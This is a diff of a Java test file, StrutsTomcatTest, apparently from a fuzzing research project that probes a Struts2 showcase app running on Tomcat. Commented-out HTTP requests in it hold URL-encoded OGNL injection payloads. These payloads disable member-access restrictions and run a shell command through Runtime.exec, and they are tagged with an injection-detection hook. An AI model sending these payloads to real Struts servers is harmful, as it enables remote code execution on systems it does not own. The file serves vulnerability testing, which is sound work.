@@ -94,7 +94,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 
             String line = reader.readLine();
 
-           // System.out.println(line);
+            System.out.println(line);
             if (line.startsWith("\0")) {
                 throw new IllegalStateException("SERVER EXCEPTION!");
             }
@@ -143,7 +143,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
             BufferedReader reader = new BufferedReader(new InputStreamReader(new ByteArrayInputStream(wrapper.getOut().array())));
 
             String line = reader.readLine();
-            //System.out.println(line);
+            System.out.println(line);
 
             // For whatever reason, calling the HTTP11Processor yields an empty response in the case of an Exception
             // on the server end.
@@ -300,8 +300,12 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 
             }
         }, null).evaluate();
-      StrutsTomcatTest.tomcat.getServer().await();
+     // StrutsTomcatTest.tomcat.getServer().await();
 
+//        String request = "POST /struts2-showcase-2_3_10/integration/editGangster.action HTTP/1.1" + "\r\n"+
+//        "Host: any" + "\r\n" + "Content-Type: application/x-www-form-urlencoded\r\n" +
+//        "Content-Length: 1336\r\n\r\n" + "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=If-Range&bustedBefore=Accept-Encoding&description=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D\r\n\r\n";
+//
 
 //        String request = "POST /" + test.webapp_string + "/integration/saveGangster.action HTTP/1.1\r\n" +
 //                "Host: any\r\n" +
@@ -315,7 +319,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                "Connection: keep-alive\r\n" +
 //                "Cookie: JSESSIONID=355085EC5421F19AF97B123A53841DF7\r\n" +
 //                "Upgrade-Insecure-Requests: 1\r\n\r\n" +
-//                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
+////                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
 
 
 //        String request = "POST /struts2-showcase-2_3_10/integration/saveGangster.action HTTP/1.1\r\n" +
@@ -324,7 +328,7 @@ public class StrutsTomcatTest extends TomcatBaseTest {
 //                "From: ya\r\n" +
 //                "gjlryn\r\n\r\n" +
 //                "name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%40edu.berkeley.cs.jqf.examples.tomcat.OGNLInjection%40setInjectionDetected%28true%29%29.%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27ls%27%29%29%7D&age=33&bustedBefore=true&__checkbox_bustedBefore=true&description=\r\n\r\n";
-//
-//        test.processHTTPRequest(request);
+
+ //       test.processHTTPRequest(request);
     }
 }
